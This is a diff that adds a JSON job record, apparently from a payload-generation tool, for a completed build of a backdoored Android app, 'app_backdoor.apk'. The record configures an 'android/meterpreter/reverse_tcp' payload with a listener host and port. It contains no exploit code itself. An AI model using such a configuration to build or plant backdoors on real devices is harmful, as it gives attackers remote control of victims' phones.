@@ -1,0 +1,26 @@
+{
+  "id": "a4c2f33b-android",
+  "date": "20250809",
+  "kind": "android",
+  "state": "SUCCEEDED",
+  "created_at": 1754709360.970127,
+  "started_at": 1754709360.9831522,
+  "finished_at": 1754709377.3964558,
+  "params": {
+    "lhost": "10.6.56.3",
+    "lport": "4444",
+    "payload": "android/meterpreter/reverse_tcp"
+  },
+  "artifacts": [
+    {
+      "name": "app_backdoor.apk",
+      "path": "/workspace/tasks/20250809/a4c2f33b-android/output/app_backdoor.apk",
+      "size_bytes": 10231,
+      "sha256": "37322f72f4d2f57eb4a57da5ee6495ae6daa1785857705cee697f076d913a32f"
+    }
+  ],
+  "logs": {
+    "build": "/workspace/tasks/20250809/a4c2f33b-android/logs/build.log"
+  },
+  "error": null
+}
